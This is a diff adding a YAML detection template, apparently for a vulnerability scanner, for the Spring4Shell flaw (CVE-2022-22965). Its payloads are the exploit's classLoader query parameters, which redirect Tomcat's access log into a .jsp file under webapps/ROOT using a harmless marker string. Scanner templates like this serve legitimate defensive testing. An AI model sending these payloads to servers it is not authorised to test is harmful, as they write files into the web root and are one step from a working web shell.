@@ -1,0 +1,25 @@
+id: spring4shell
+info:
+  name: "Spring4Shell (CVE-2022-22965)"
+  severity: critical
+  description: "Detects Spring Framework RCE via class loader manipulation"
+  tags: [cve, spring, java, rce]
+  author: Wired
+
+inject: query_params
+detection: pattern
+
+payloads:
+  - "class.module.classLoader.URLs%5B0%5D=0"
+  - "class.module.classLoader.resources.context.parent.pipeline.first.pattern=akemi_spring4shell"
+  - "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
+  - "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
+  - "class.module.classLoader.resources.context.parent.pipeline.first.prefix=akemi"
+
+matchers:
+  body_patterns:
+    - "akemi_spring4shell"
+    - "(?i)class\\.module\\.classLoader"
+  status_codes:
+    - 200
+    - 400
